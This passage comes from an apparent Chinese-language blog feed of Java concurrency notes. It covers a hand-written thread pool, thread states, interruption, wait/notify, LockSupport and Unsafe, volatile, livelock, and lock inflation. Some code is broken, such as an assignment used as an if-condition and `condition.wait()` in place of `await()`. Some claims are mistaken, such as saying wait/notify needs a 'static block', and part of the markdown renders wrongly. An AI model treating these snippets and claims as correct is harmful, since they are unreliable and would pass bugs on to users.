class="keyword">static</span> <span class="keyword">final</span> BlockingDeque&lt;Runnable&gt; task = <span class="keyword">new</span> <span class="title class_">LinkedBlockingDeque</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定制任务队列长度，当队列长度溢出，触发溢出策略</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> queueSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要指定多个线程去执行</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> CORE_POOL_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 任务溢出策略</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RejectedExecutionHandler handler;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用工厂模式统一管理线程的创建，例如线程名等信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ThreadFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查在线线程数量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">AtomicInteger</span> <span class="variable">workThreadSize</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">      <span class="comment">// 这里应该进行同步，因为判断与添加是两个操作</span></span><br><span class="line">        <span class="keyword">if</span> (workThreadSize.get() &lt; CORE_POOL_SIZE) &#123;</span><br><span class="line">            <span class="comment">// 如果线程数不到核心线程数，没进入一个任务，就添加一个线程</span></span><br><span class="line">            addThread();</span><br><span class="line">        &#125;</span><br><span class="line">        taskAdd(r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">addThread</span><span class="params">()</span> &#123;</span><br><span class="line">        factory.newThread(() -&gt; &#123;</span><br><span class="line">          <span class="keyword">if</span> (workThreadSize.get() = CORE_POOL_SIZE) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="type">Runnable</span> <span class="variable">poll</span> <span class="operator">=</span> task.poll(<span class="number">60</span>, TimeUnit.SECONDS);</span><br><span class="line">                    <span class="keyword">if</span> (poll == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//但当我们任务量可能已经渐渐平缓了，就不再需要那么多线程监听了,这里我们默认可以只剩5个，当然也可以作为参数调整</span></span><br><span class="line">                        <span class="keyword">if</span> (workThreadSize.get() &gt; <span class="number">5</span>) &#123;</span><br><span class="line">                            <span class="keyword">synchronized</span> (Executor.class) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (workThreadSize.get() &gt; <span class="number">5</span>) &#123;</span><br><span class="line">                                    <span class="comment">// 让线程结束</span></span><br><span class="line">                                    Thread.currentThread().interrupt();</span><br><span class="line">                                    workThreadSize.decrementAndGet();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 当读取到任务时，就开始执行。</span></span><br><span class="line">                    poll.run();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 通过一个自旋锁，来保证在线线程数准确</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> workThreadSize.get();</span><br><span class="line">            <span class="keyword">if</span> (workThreadSize.compareAndSet(size,size+<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">taskAdd</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (task.size()&gt;queueSize) &#123;</span><br><span class="line">            <span class="comment">// 这里可以定义不同的任务溢出策略</span></span><br><span class="line">            handler.rejectedExecution(r,<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        task.add(r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">myExecutor</span><span class="params">(<span class="type">int</span> thread_size)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.queueSize = <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">this</span>.CORE_POOL_SIZE = thread_size;</span><br><span class="line">        <span class="comment">// 如果线程池队列满了丢掉这个任务并且抛出RejectedExecutionException异常。</span></span><br><span class="line">        <span class="built_in">this</span>.handler = <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.AbortPolicy();</span><br><span class="line">        <span class="built_in">this</span>.factory = Executors.defaultThreadFactory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">myExecutor</span><span class="params">(<span class="type">int</span> queueSize, <span class="type">int</span> CORE_POOL_SIZE, RejectedExecutionHandler handler, ThreadFactory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.queueSize = queueSize;</span><br><span class="line">        <span class="built_in">this</span>.CORE_POOL_SIZE = CORE_POOL_SIZE;</span><br><span class="line">        <span class="built_in">this</span>.handler = handler;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li></ol><p>这里JUC包下定义的参数</p><p><img src="/Users/qinsicheng/Desktop/008vxvgGly1h7lb0r2w9lj317403sjsj.png" alt="image-20221028210505748"></p><p>这里是我们，自己定义的，唯一不一样就是少了<code>maximumPoolSize</code>,也就是再对线程数量进行控制，这里感兴趣的朋友可以自己试着去做。</p><p><img src="/Users/qinsicheng/Desktop/008vxvgGly1h7lb2r7broj30wj03bmxp.png" alt="image-20221028210704145"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    如果你能跟随着思路完成到这里，我觉得这块儿知识点，你应该是没问题了，具体代码细节，或者是组件如何使用，就靠你们自己去查询和实验。我感觉我的代码还是通俗易懂的。这里再次感谢<code>低并发编程</code>公众号，我感觉干活满满，推荐大家读一读。</p>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程</title>
      <link href="/2022/11/25/%E5%B9%B6%E5%8F%91/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/11/25/%E5%B9%B6%E5%8F%91/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="基础的概念"><a href="#基础的概念" class="headerlink" title="基础的概念"></a>基础的概念</h2><h3 id="什么是并发操作？"><a href="#什么是并发操作？" class="headerlink" title="什么是并发操作？"></a>什么是并发操作？</h3><p>利用多核CPU去完成任务，类似于使用影分身去完成不同的作业，这肯定比我一个人一个个写要快的多</p><h3 id="什么时候可以使用并发？"><a href="#什么时候可以使用并发？" class="headerlink" title="什么时候可以使用并发？"></a>什么时候可以使用并发？</h3><p>当有多核CPU时。如果只有一个CPU，那并发实际上只是线程的不断切换，好比我在数学作业上先写点儿，再到语文上再写点儿，因为处理的很快，给人的感觉是同时操作的。但实际上只会比原来更慢。</p><h3 id="如何使用并发编程？"><a href="#如何使用并发编程？" class="headerlink" title="如何使用并发编程？"></a>如何使用并发编程？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicLearn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">A</span>()).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;String&gt;(<span class="keyword">new</span> <span class="title class_">B</span>())).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">C</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 无返回值</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 有返回值</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; a &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>实现Runnable或Callable接口，从写run方法。</li><li>继承Thread类，从写run方法</li></ol><h3 id="实现Runnable-和-继承Thread有什么区别"><a href="#实现Runnable-和-继承Thread有什么区别" class="headerlink" title="实现Runnable 和 继承Thread有什么区别"></a>实现Runnable 和 继承Thread有什么区别</h3><ol><li>Java是单继承结构，如果继承Thread，无法继承其他的类，接口更灵活</li><li>继承Thread开销会大一些，如果我们只要求可运行</li></ol><h3 id="线程的分类"><a href="#线程的分类" class="headerlink" title="线程的分类"></a>线程的分类</h3><ol><li><p>普通线程，就是我们上面所讲的内容</p></li><li><p>守护线程，也叫做<code>Daemon</code>，当所有非守护线程结束后，守护线程就会被回收。比如说垃圾回收就是守护线程</p><ol><li>```java<br>// 注意守护线程不能操作重要的数据，因为无法保证可以执行完后，守护线程才停止。<br>public static void main(String[] args) {<pre><code>Thread thread = new Thread(new MyRunnable());thread.setDaemon(true);</code></pre>}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 线程的状态</span><br><span class="line"></span><br><span class="line">1. New ：创建好，但还未启动</span><br><span class="line">2. Runable ：Runable本身是两个状态，一个是Runable表示等待CPU时间片的线程，一个是Running表示正在使用时间片的线程</span><br><span class="line">3. Blocked ：阻塞住的线程 </span><br><span class="line">4. Waiting  ：一直等待线程，直到被唤醒</span><br><span class="line">5. Time Waiting ：有时间的等待，到时间自己醒了</span><br><span class="line">6. terminted ：线程结束</span><br><span class="line"></span><br><span class="line">### 线程的中断</span><br><span class="line"></span><br><span class="line">​听起来线程的中断有点儿像人家正好好干活，你突然把人家赶走了。但实际上是这个线程在 Blocked 或 Waiting 时，我们将其打断，让他别等了。</span><br><span class="line"></span><br><span class="line">​我们常用：`interrupt() ` 来打断线程，打断后会抛出 InterruptedException，从而提前结束该线程。但是**不能中断 I/O 阻塞和 synchronized 锁阻塞**。也是比较好判断的就是你看方法的调用是否有InterruptedException,如果有说明可以被打断。</span><br><span class="line"></span><br><span class="line">​如果该线程好好干活，我们是无法将其打断的。调用 `interrupt()`，只会是将其内部状态作为修改，通过 `interrupted()` 我们可以看这个线程是否被打断过，在 `while（true）中我们可以通过使用 interrupted() 来判断是否跳出循环 `</span><br><span class="line"></span><br><span class="line">​在使用 Executor 去管理多个线程任务时，有方法 `shutdown() 和 shutdownNow()`，区别是 shutdown() 是等所有线程执行完后进行结束。而shutdownNow()表示现在就可以结束了。</span><br><span class="line"></span><br><span class="line">### 多线程的缺点</span><br><span class="line"></span><br><span class="line">​一旦涉及到多线程，总是面临着数据安全的问题，如果一组操作没有原子性，那在多线程的情况下就会出现数据安全的问题。所以为了数据的安全性，我们引出了锁的概念，线程去抢同一把锁，谁抢到了谁去操作数据，其他人就在外面等着（阻塞），直到锁被之前持有的线程释放。锁的实现分为很多种，我们下面会介绍。</span><br><span class="line"></span><br><span class="line">### 线程各个操作导致的状态</span><br><span class="line"></span><br><span class="line">​这里我们常在使用锁的情况下来描述，比方说多个线程抢同一把锁，如果使用 `Thread.sleep() 或 Thread.yield() `是否会放回锁。</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">// 线程进入Runable，但未释放锁资源</span><br><span class="line">Thread.yield();</span><br><span class="line">// 线程进入Blocked，但未释放锁资源</span><br><span class="line">Thread.sleep();</span><br><span class="line">// 线程进入Waiting状态，释放锁资源</span><br><span class="line">objectLock.wait();</span><br><span class="line">// 底层实际用的wait(), 释放锁资源</span><br><span class="line">Thread.join();</span><br></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p>这里有个小问题：<code>objectLock.notify() 与 objectLock.notifyall() </code> 有什么区别？</p></blockquote><p>notify是释放一个线程去抢锁，notifyall是释放所有等待的去抢锁，但只有一个能抢到。这看起来感觉不到区别。</p><p>实际上每个对象底层有两个池：锁池 和 等待池</p><ol><li>在锁池的是阻塞状态，当锁被释放，所有在锁池的对象都有机会获得锁</li><li>在等待池的是等待状态，是没有资格去抢锁的，只能被人唤醒</li></ol><p>​    当A线程抢到锁后，B线程没抢到就进入了锁池，A线程虽然抢到了，但是需要的资源没到位，使用了wait，进入的是等待池。这时候B就可以获取锁，并执行业务了，但A因为在等待池，所以即便是锁没被占用，自己仍无法操作，直到被唤醒。</p><p>​    notify() 是将等待池的一个线程加入锁池，而notifyall() 是将等待池中的所有线程加入锁池。</p><h3 id="当一个线程需要等待另一个线程的资源"><a href="#当一个线程需要等待另一个线程的资源" class="headerlink" title="当一个线程需要等待另一个线程的资源"></a>当一个线程需要等待另一个线程的资源</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">start</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objectLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        objectLock.wait();</span><br><span class="line">        objectLock.notify();</span><br><span class="line"></span><br><span class="line">        <span class="type">ReentrantLock</span> <span class="variable">reentrantLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">        <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> reentrantLock.newCondition();</span><br><span class="line">        condition.wait();</span><br><span class="line">        condition.signalAll();</span><br><span class="line"></span><br><span class="line">        LockSupport.park();</span><br><span class="line">        LockSupport.unpark(Thread.currentThread());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我们主线程需要等待一个启动线程返回的结果，我们可以直接使用<code>Thread.join()</code>,等待该线程将资源返回，但这种方式必须要等到线程结束，主线程才能去获取，非常不灵活。因此我们常使用 <code>Object.wait() 与 Object.notify()</code>  方法可以更加主动的去等待与被通知。但有什么缺陷呢？</p><ol><li> 必须在静态代码块儿中使用，负责会抛出异常，这一点在 <code>condition.wait() 与condition.signal() </code>也存在</li><li>必须先<code>wait() 再 notify()</code> 否则会报错，因此我们常用：<code>LockSupport.park();</code></li></ol><p>LockSupport.park(); 底层使用的Unsafe类，它是可以操作线程和内存的，所以说不安全，要规范使用，在Atomic类中底层调用的也是它。而且它不能被直接获取，只能通过反射来获取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UnsafeAccessor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Unsafe unsafe;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            unsafe = (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h3><h4 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a>可见性</h4><p>这里设计线程的工作内存与主内存数据的交互，为什么有工作内存，就是因为CPU对寄存器的操作远远超出了对内存的操作，所以线程是工作内存拷贝主内存，来使得CPU操作工作内存更快速，</p><h4 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a>有序性</h4><p>禁止指令重排</p><h4 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h4><p>Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8faeik83zj30u70ifgnm.jpg" alt="image-20221123193040531"></p><h3 id="ReentrantLock-源码解读"><a href="#ReentrantLock-源码解读" class="headerlink" title="ReentrantLock 源码解读"></a>ReentrantLock 源码解读</h3><h3 id="活锁，死锁，哲学家问题"><a href="#活锁，死锁，哲学家问题" class="headerlink" title="活锁，死锁，哲学家问题"></a>活锁，死锁，哲学家问题</h3><p>活锁： 两个线程互相影响彼此依赖的变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLiveLock</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">10</span>;<span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 期望减到 0 退出循环</span></span><br><span class="line">            <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                sleep(<span class="number">0.2</span>);</span><br><span class="line">                count--;</span><br><span class="line">                log.debug(<span class="string">&quot;count: &#123;&#125;&quot;</span>, count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 期望超过 20 退出循环</span></span><br><span class="line">            <span class="keyword">while</span> (count &lt; <span class="number">20</span>) &#123;</span><br><span class="line">                sleep(<span class="number">0.2</span>);</span><br><span class="line">                count++;</span><br><span class="line">                log.debug(<span class="string">&quot;count: &#123;&#125;&quot;</span>, count);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>死锁：程序需要获取两把锁才能向下执行，两个线程各拿到了一把锁，等待另一把，导致双方都进入阻塞。</p><p>哲学家问题就是死锁问题的一种形式。</p><h2 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a>进阶知识</h2><h3 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h3><p>Java对象头</p><p>普通对象：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8faus1kkwj30kw04ljrt.jpg" alt="image-20221123194620216"></p><p>数组对象：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8fav2bu47j30rt04t3z6.jpg" alt="image-20221123194636687"></p><p>其中Mark Wordd的内部结构（32位虚拟机）</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8favja6noj30on0bwtal.jpg" alt="image-20221123194704096"></p><p>64位虚拟机</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8faw6ikyrj30sh0bjwgm.jpg" alt="image-20221123194741408"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123;&#125;</span><br></pre></td></tr></table></figure><p>当<code>synchronized 对对象加入重量级锁时，Mark Work中就会有指向Monitor对象的指针</code>，下面我们看看Monitor的结构</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8fb7t8hbdj30uq0cf0u9.jpg" alt="image-20221123195851860"></p><p>WaitSet 就是等待队列</p><p>EntryList 就是阻塞队列</p><p>Owner 就是当前获取锁的线程</p><h3 id="锁优化"><a href="#锁优化" class="headerlink" title="锁优化"></a>锁优化</h3><h4 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h4><p>​    以前线程没有抢到锁，就会直接进入阻塞队列，但这代价太大了，所以JDK1.6后，因为了自旋锁，也就是抢不到锁后，没立刻阻塞，而是继续尝试获取锁，最后实在不行，就阻塞，因为也占用CPU资源。尝试几次是看之前获取几次来判断的，这也是自适应自旋锁的一个特点。</p><p>​    自旋会占用CPU，所以单核CPU自旋就是浪费，只有多核CPU才能提高性能</p><h4 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h4><p>​    通过逃逸分析，发现一个虽然加锁了，但实际上数据是无法被外界影响的，就会把锁消除。</p><h4 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h4><p>​    对一个对象反复的加锁解锁，性能影响很大，如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。</p><h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><ol><li>对使用者透明：<code>synchronized</code></li><li>多线程访问的时间是错开的，可用轻量级锁来优化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">synchronized</span>( obj ) &#123;</span><br><span class="line"> <span class="comment">// 同步块 A</span></span><br><span class="line"> method2();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">synchronized</span>( obj ) &#123;</span><br><span class="line"> <span class="comment">// 同步块 B</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当遇到加锁操作时，线程的栈帧中会创建一个（Lock Record）对象，每个线程的栈帧都会包含一个锁记录的解耦，内部存放锁定对象的Mark Word</li></ul><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g07uvra5j30n00cl0ty.jpg" alt="image-20221124102353283"></p><ul><li><p>让锁记录中 Object reference 指向锁对象，并尝试用 cas 替换 Object 的 Mark Word，将 Mark Word 的值存入锁记录。</p><ul><li>如果成功说明，锁当前没有被占用，01 代表无锁，00代表轻量级锁，对象头中存储了 锁记录地址和状态 00 ，表示由该线程给对象加锁</li><li>如果失败说明，有竞争，进入锁膨胀过程</li><li>如果发现有竞争，但是可以通过Mark Word 判断加锁的线程是不是自己，如果是自己，则再添加一个Lock Record作为重入计数</li></ul><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g0bqg2mpj30oy0e3abi.jpg" alt="image-20221124102736732"></p></li></ul><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g0ed5zh5j30p70ftmz3.jpg" alt="image-20221124103008743"></p><p>​    当退出 synchronized 代码块（解锁时）如果有取值为 null 的锁记录，表示有重入，这时重置锁记录，表示重入计数减一。</p><p>​    当退出 synchronized 代码块（解锁时）锁记录的值不为 null，这时使用 cas 将 Mark Word 的值恢复给对象头</p><ul><li><p>成功，则解锁成功</p></li><li><p>失败，说明轻量级锁进行了锁膨胀或已经升级为重量级锁，进入重量级锁解锁流程</p></li></ul><h4 id="锁膨胀"><a href="#锁膨胀" class="headerlink" title="锁膨胀"></a>锁膨胀</h4><p>​    当发现线程竞争发生了直接冲突时，就会将Object中MarkWork指向Monitor，并且将状态改为10。10就是重量级锁。阻塞线程就进入Monitor的EntryList进行阻塞。</p><p>​    当持有轻量级锁的线程进行cas操作时，发现失败了，就说明现在已经是重量级锁了，则通过Monitor地址找到Monitor对象，将Owner设置为空，表示锁释放，然后通知EntryList阻塞线程唤醒。</p><p><img 